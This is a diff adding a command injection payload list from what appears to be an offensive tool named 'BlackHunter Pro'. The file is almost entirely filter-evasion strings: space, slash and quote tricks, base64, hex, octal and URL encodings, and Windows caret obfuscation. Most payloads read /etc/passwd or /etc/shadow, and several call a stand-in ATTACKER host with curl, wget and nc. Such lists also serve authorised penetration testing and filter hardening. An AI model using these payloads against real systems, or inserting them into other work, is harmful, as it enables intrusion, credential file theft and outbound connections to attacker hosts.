@@ -1,0 +1,492 @@
+# payloads/cmdi/bypass.txt
+# Command Injection Filter Bypass Payloads
+# BlackHunter Pro
+
+# =============================================
+# SPACE BYPASS - IFS (Internal Field Separator)
+# =============================================
+
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat${IFS}$1/etc/passwd
+;cat$IFS$9/etc/passwd
+;ls${IFS}-la
+;ls$IFS-la
+;id${IFS}-a
+;whoami${IFS}-a
+;cat${IFS}/etc/passwd
+;cat${IFS}/etc/shadow
+;cat${IFS}/etc/hosts
+;cat${IFS}/etc/hostname
+;ping${IFS}-c${IFS}5${IFS}127.0.0.1
+;sleep${IFS}5
+;curl${IFS}http://ATTACKER/
+;wget${IFS}http://ATTACKER/
+;nc${IFS}ATTACKER${IFS}4444
+
+# =============================================
+# SPACE BYPASS - TAB
+# =============================================
+
+;cat%09/etc/passwd
+;cat	/etc/passwd
+;id%09-a
+;ls%09-la
+;ping%09-c%095%09127.0.0.1
+;sleep%095
+;cat%09/etc/passwd
+
+# =============================================
+# SPACE BYPASS - NEWLINE
+# =============================================
+
+;cat%0a/etc/passwd
+;cat%0d/etc/passwd
+;cat%0d%0a/etc/passwd
+;id%0a-a
+;ls%0a-la
+;ping%0a-c%0a5%0a127.0.0.1
+;sleep%0a5
+
+# =============================================
+# SPACE BYPASS - BRACE EXPANSION
+# =============================================
+
+;{cat,/etc/passwd}
+;{ls,-la}
+;{id,-a}
+;{whoami,-a}
+;{cat,/etc/passwd,/etc/shadow}
+;{ping,-c,5,127.0.0.1}
+;{sleep,5}
+;{curl,http://ATTACKER/}
+;{wget,http://ATTACKER/}
+
+# =============================================
+# SPACE BYPASS - REDIRECTION
+# =============================================
+
+;cat</etc/passwd
+;cat<>/etc/passwd
+;cat 0</etc/passwd
+;cat 1</etc/passwd
+;cat<&0
+;<&0 cat /etc/passwd
+;cat>/dev/null</etc/passwd
+
+# =============================================
+# SLASH BYPASS
+# =============================================
+
+;cat ${PATH:0:1}etc${PATH:0:1}passwd
+;cat ${PWD:0:1}etc${PWD:0:1}passwd
+;cat ${HOME:0:1}etc${HOME:0:1}passwd
+;cat $(echo /)etc$(echo /)passwd
+;cat `echo /`etc`echo /`passwd
+;cat $'/'etc$'/'passwd
+;cat $"/"etc$"/"passwd
+;cd /; cat etc/passwd
+;cd ${PATH:0:1}; cat etc/passwd
+;cat ${PATH%%[a-z]*}etc${PATH%%[a-z]*}passwd
+
+# =============================================
+# DOT BYPASS
+# =============================================
+
+;cd ..; cat etc/passwd
+;cd .. && cat etc/passwd
+;cat /e?c/p?sswd
+;cat /e??/passwd
+;cat /e*c/p*sswd
+;cat /etc/pass?d
+;cat /etc/pas?wd
+;cat /etc/*sswd
+;cat /etc/pass*
+;cat /???/??????
+;cat /e?c/p?ss?d
+
+# =============================================
+# COMMAND BYPASS - QUOTES
+# =============================================
+
+;c'a't /etc/passwd
+;c"a"t /etc/passwd
+;c'a't /e't'c/pas's'wd
+;wh'o'ami
+;w"h"o"a"m"i
+;i'd'
+;l's' -la
+;c\at /etc/passwd
+;ca\t /etc/passwd
+;cat /etc/pass\wd
+;cat /e\tc/passwd
+;c'a't /etc/'passwd'
+;c"a"t /etc/"passwd"
+
+# =============================================
+# COMMAND BYPASS - BACKSLASH
+# =============================================
+
+;c\at /etc/passwd
+;\c\a\t /etc/passwd
+;cat\ /etc/passwd
+;cat /et\c/passwd
+;cat /etc/pass\wd
+;ca\t\ /etc/passwd
+;wh\oami
+;i\d
+;l\s -la
+
+# =============================================
+# COMMAND BYPASS - WILDCARDS
+# =============================================
+
+;cat /etc/pass*
+;cat /etc/pas*
+;cat /etc/p*
+;cat /e??/p?????
+;cat /e*c/p*sswd
+;cat /???/??????
+;/bin/c?t /etc/passwd
+;/???/??t /etc/passwd
+;/bin/c*p /etc/passwd
+;cat /etc/pass?d
+;cat /etc/*sswd
+
+# =============================================
+# ENCODING - BASE64
+# =============================================
+
+;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
+;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+;echo aWQ= | base64 -d | sh
+;echo d2hvYW1p | base64 -d | bash
+;echo bHMgLWxh | base64 -d | sh
+;`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`
+;$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
+;eval$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
+;bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"
+
+# =============================================
+# ENCODING - HEX
+# =============================================
+
+;echo 636174202f6574632f706173737764 | xxd -r -p | sh
+;echo 636174202f6574632f706173737764 | xxd -r -p | bash
+;printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh
+;printf '\x69\x64' | sh
+;$(printf '\x69\x64')
+;`printf '\x69\x64'`
+;echo -e '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh
+
+# =============================================
+# ENCODING - OCTAL
+# =============================================
+
+;$(printf '\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144')
+;$(printf '\151\144')
+;$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
+;$'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144'
+
+# =============================================
+# ENCODING - URL
+# =============================================
+
+;%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64
+;%69%64
+;%77%68%6f%61%6d%69
+;%6c%73%20%2d%6c%61
+
+# =============================================
+# ENCODING - DOUBLE URL
+# =============================================
+
+;%2563%2561%2574%2520%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564
+;%2569%2564
+
+# =============================================
+# ENCODING - UNICODE
+# =============================================
+
+;\u0063\u0061\u0074 /etc/passwd
+;\x63\x61\x74 /etc/passwd
+;$'\u0063\u0061\u0074 /etc/passwd'
+;$'\x63\x61\x74 /etc/passwd'
+
+# =============================================
+# VARIABLE EXPANSION
+# =============================================
+
+;a=cat;b=/etc/passwd;$a $b
+;a=cat;b=/etc/passwd;$a$IFS$b
+;A=cat;B=/etc/passwd;$A $B
+;c=cat;d=/etc/passwd;$c $d
+;x=id;$x
+;y=whoami;$y
+;cmd=ls;opt=-la;$cmd $opt
+;foo=id;echo $($foo)
+;cmd=cat;file=/etc/passwd;$cmd $file
+;a=cat;$a</etc/passwd
+;b=id;$b
+;foo=cat;bar=/etc/passwd;${foo} ${bar}
+;a=cat;b=/etc/passwd;$a${IFS}$b
+
+# =============================================
+# COMMAND SUBSTITUTION VARIANTS
+# =============================================
+
+;$(id)
+;`id`
+;$((1+1))
+;$(echo id | sh)
+;`echo id | sh`
+;$(echo "id")
+;`echo "id"`
+;$(cat /etc/passwd)
+;`cat /etc/passwd`
+;$(whoami)
+;`whoami`
+;$(uname -a)
+;`uname -a`
+;$(ls -la)
+;`ls -la`
+
+# =============================================
+# COMMENT BYPASS
+# =============================================
+
+;cat /etc/passwd #
+;cat /etc/passwd //
+;cat /etc/passwd/*
+;cat /etc/passwd;#
+;cat /etc/passwd%00
+;cat /etc/passwd%20%00
+;cat /etc/passwd%0a%00
+;cat /etc/passwd;#comment
+;cat /etc/passwd # comment
+;cat /etc/passwd //comment
+;cat /etc/passwd;//
+;cat /etc/passwd/*
+;cat /etc/passwd;-- 
+;cat /etc/passwd;%23
+
+# =============================================
+# CASE VARIATION
+# =============================================
+
+;CAT /etc/passwd
+;Cat /etc/passwd
+;CaT /etc/passwd
+;ID
+;Id
+;WHOAMI
+;WhoAmI
+;LS -LA
+;Ls -La
+
+# =============================================
+# ALTERNATIVE COMMANDS
+# =============================================
+
+;echo $(cat /etc/passwd)
+;printf "$(cat /etc/passwd)"
+;head /etc/passwd
+;tail /etc/passwd
+;more /etc/passwd
+;less /etc/passwd
+;nl /etc/passwd
+;od -c /etc/passwd
+;xxd /etc/passwd
+;strings /etc/passwd
+;grep "" /etc/passwd
+;awk '{print}' /etc/passwd
+;sed -n '1,10p' /etc/passwd
+;cut -d: -f1 /etc/passwd
+;sort /etc/passwd
+;uniq /etc/passwd
+
+# =============================================
+# NESTED COMMANDS
+# =============================================
+
+;$(cat$(echo /etc/passwd))
+;`cat /etc/passwd`
+;$(cat /etc/passwd | base64)
+;$(base64 /etc/passwd)
+;$(cat /etc/passwd | rev)
+;$(rev /etc/passwd)
+;$(cat /etc/passwd | xxd)
+;$(cat /etc/passwd | tr -d '\n')
+
+# =============================================
+# FILTER BYPASS - REMOVE ../ FILTER
+# =============================================
+
+;cat ....//....//....//....//etc/passwd
+;cat ..././..././..././etc/passwd
+;cat ..%2f..%2f..%2fetc/passwd
+;cat ..%5c..%5c..%5cetc/passwd
+;cat ....\/....\/....\/etc/passwd
+;cat .../.../.../etc/passwd
+;cat ..;/..;/..;/etc/passwd
+;cat ..%00/..%00/..%00/etc/passwd
+
+# =============================================
+# FILTER BYPASS - REMOVE SPACES FILTER
+# =============================================
+
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat%09/etc/passwd
+;cat%0a/etc/passwd
+;cat</etc/passwd
+;cat<>/etc/passwd
+;{cat,/etc/passwd}
+;cat$IFS$9/etc/passwd
+;cat${IFS}$1/etc/passwd
+
+# =============================================
+# FILTER BYPASS - REMOVE SEMICOLON FILTER
+# =============================================
+
+|cat /etc/passwd
+||cat /etc/passwd
+&cat /etc/passwd
+&&cat /etc/passwd
+%0acat /etc/passwd
+%0dcat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;cat /etc/passwd
+
+# =============================================
+# FILTER BYPASS - REMOVE PIPES FILTER
+# =============================================
+
+;cat /etc/passwd
+&cat /etc/passwd
+&&cat /etc/passwd
+||cat /etc/passwd
+%0acat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+;cat /etc/passwd
+
+# =============================================
+# FILTER BYPASS - REMOVE COMMANDS FILTER
+# =============================================
+
+;# comment
+;cat /etc/passwd
+;echo $(cat /etc/passwd)
+;$(cat /etc/passwd)
+;`cat /etc/passwd`
+;bash -c "cat /etc/passwd"
+;sh -c "cat /etc/passwd"
+;python -c "print(open('/etc/passwd').read())"
+;perl -e "print \`cat /etc/passwd\`"
+;php -r "echo file_get_contents('/etc/passwd');"
+;ruby -e "puts File.read('/etc/passwd')"
+
+# =============================================
+# COMBINED BYPASS
+# =============================================
+
+;c'a't${IFS}/e't'c/pas's'wd
+;c"a"t$IFS/e"t"c/pas"s"wd
+;c\at${IFS}/et\c/pass\wd
+;cat${IFS}/e??/p?????
+;cat$IFS/e*c/p*sswd
+;$(printf '\143\141\164')${IFS}/etc/passwd
+;`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d`
+;a=cat;b=/etc/passwd;$a$IFS$b
+;cd /;cat${IFS}etc/passwd
+;/???/??t${IFS}/etc/passwd
+;cat${IFS}/etc/pass*|head -1
+;cat$IFS/etc/passwd;#comment
+
+# =============================================
+# WINDOWS BYPASS
+# =============================================
+
+& whoami
+& w"h"o"a"m"i
+& wh^oami
+& wh""oami
+& who^ami
+& %COMSPEC% /c whoami
+& cmd /c whoami
+& cmd.exe /c whoami
+& cm^d /c whoami
+& whoami%00
+& whoami%00.exe
+& (whoami)
+& %USERNAME%
+& %USERPROFILE%
+& %COMPUTERNAME%
+& type C:\Windows\win.ini
+& t"y"p"e" C:\Windows\win.ini
+& ty^pe C:\Windows\win.ini
+& type C:\Windows\win.ini
+& type C:\Windows\win.ini%00
+& dir C:\
+& d"i"r C:\
+& di^r C:\
+& %SystemRoot%\System32\cmd.exe /c whoami
+& powershell -c whoami
+& powershell -Command whoami
+& pwsh -c whoami
+
+# =============================================
+# UNICODE/UTF-8 BYPASS
+# =============================================
+
+;\u0063\u0061\u0074 /etc/passwd
+;$'\u0063\u0061\u0074 /etc/passwd'
+;%c0%afetc/passwd
+;%c1%9cWindows\win.ini
+;%e0%80%afetc/passwd
+;..%c0%af..%c0%afetc/passwd
+
+# =============================================
+# DEEP NESTED BYPASS
+# =============================================
+
+;$(echo $(echo $(echo cat) ) $(echo /etc/passwd) )
+;`echo `echo cat`` /etc/passwd
+;$($(echo cat) /etc/passwd)
+;$(echo "$(echo "cat")")$(echo " /etc/passwd")
+;a=$(echo cat);b=$(echo /etc/passwd);$a $b
+;x=$(cat /etc/passwd);echo $x
+;$([[ $(id -u) -eq 0 ]] && cat /etc/passwd)
+
+# =============================================
+# FULL BYPASS EXAMPLES
+# =============================================
+
+# Example 1: Space + Slash bypass
+;cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+
+# Example 2: Command + Space bypass
+;c'a't${IFS}/etc/passwd
+
+# Example 3: Base64 + Command bypass
+;$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
+
+# Example 4: Variable + Space bypass
+;a=cat;b=/etc/passwd;$a${IFS}$b
+
+# Example 5: Wildcard + Space bypass
+;cat${IFS}/etc/pass*
+
+# Example 6: IFS + Brace expansion
+;{cat,/etc/passwd}
+
+# Example 7: Multi-layer bypass
+;a=cat;b=${IFS};c=/etc/passwd;$a$b$c
+
+# Example 8: Filter + Encoding bypass
+;$'\x63\x61\x74'${IFS}/etc/passwd
+
+# Example 9: Ultimate bypass
+;a=$(printf '\x63\x61\x74');b=${IFS};c=$(printf '\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64');$a$b$c
